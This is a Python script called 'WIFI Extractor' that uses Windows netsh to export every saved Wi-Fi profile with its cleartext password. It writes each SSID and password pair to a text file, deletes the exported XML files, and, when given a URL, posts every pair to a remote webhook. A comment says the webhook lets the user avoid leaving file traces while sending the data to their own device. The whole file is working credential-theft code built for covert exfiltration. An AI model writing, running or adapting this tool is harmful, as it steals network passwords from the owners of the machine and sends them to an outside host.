'''Thanks for using wifi extractor|Gracias por usar wifi extractor
    GitHub repository: https://github.com/hrdax/WIFI_Extractor
    '''
from time import sleep
import os, requests, subprocess, click, sys
import xml.etree.ElementTree as t
#lista de exportaciones xml que genera el netsh y Wifis
Archivos_XML_WIFI = []
WIFIs = []

@click.command()
@click.option('--url', '-u', default='', help='Webhook/POST URL')
@click.option('--no-txt', '-n', is_flag=True, help="No crea el archivo txt | Doesn't create the txt file")
@click.option('--version', '-v', is_flag=True, help='Imprime la version | Prints the version')
@click.option('--print-output', '-p', is_flag=True, help='Muestra la salida en la terminal | Shows the output in the terminal')

#funcion principal
def main(url, no_txt, version,print_output):
    if version == True:
        print('\nWIFI Extractor\n\nVersion 1.2.1\n')
        sys.exit()
    elif url != '' and no_txt == True:
        extractor(url, no_txt,print_output)
        urlweb(url)
    elif url != '' and no_txt == False:
        if url == '-n':
            no_txt = True
        extractor(url, no_txt,print_output)
        urlweb(url)
    else:
        extractor(url,no_txt, print_output)
        print('\nDone! \n\nHecho!\n')

#hara el proceso de extraccion
def extractor(url, no_txt,print_output):
    #crea el archivo txt
    if no_txt == False:
        txt = open("Extracciones.txt", "w")

    #corre el comando en la command prompt
    cmd = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

    #guarda la ruta actual
    ruta = os.getcwd()

    #recorre los archivos en la ruta
    for archivo in os.listdir(ruta):
        #encuentra los archivos xml exportados y los agrega
        if archivo.startswith("Wi-Fi-") and archivo.endswith(".xml"):
            Archivos_XML_WIFI.append(archivo)

    #contador para la lista de wifis
    conta = 0

    #recorre los archivos xml
    for archivo in Archivos_XML_WIFI:
        tr = t.parse(archivo)
        rt = tr.getroot()
        #try que verifica si el xml tiene contrasena extraible
        try:
            ssid = rt[1][0][1].text
            contrasena = rt[4][0][1][2].text
            ssid_contrasena = f"Nombre/SSID: {ssid} || CONTRASENA/PASSWORD: {contrasena}"
            WIFIs.append(ssid_contrasena)
            os.remove(archivo)
            try:
                txt.write(WIFIs[conta]+"\n")
            except:
                pass

            conta = conta + 1
            if print_output == True:
                print(f'\n{ssid_contrasena}\n')
                sleep(0.1)
        except:
            print("Omitting detected WIFI without password(Open WIFI) or WIFI with WPA-Enterprise security... SSID: "+ssid+"\nOmitiendo WIFI detectado sin contrasena(WIFI Libre) o con WPA-Enterprise security... SSID: "+ssid+"\n")
            os.remove(archivo)

    try: 
        #cierra el archivo txt
        txt.close()
    except:
        pass

#envia a la url de webhook si se especifica con la opcion -u
def urlweb(url):
    conta = 0
    #guarda la url de webhook en caso de no querer dejar rastros de archivos y usar webhook para enviar los datos remotamente a nuestro dispositivo
    urlpost = url
    try:
        print('\nSending... | Enviando...\n')
        #envia los datos a la url de webhook
        for i in WIFIs:
            conta = conta + 1
            requests.post(urlpost, data=i)
            print(f'Sent: {conta} of {len(WIFIs)}\n\nEnviado: {conta} de {len(WIFIs)}\n')
            
        print('\nDone! \n\nHecho!\n')
    except:
        print('\n***Error could not send: url not specified or invalid url | url no especificada o es invalida***\n')
        sys.exit()
        

if __name__ == '__main__':
    main()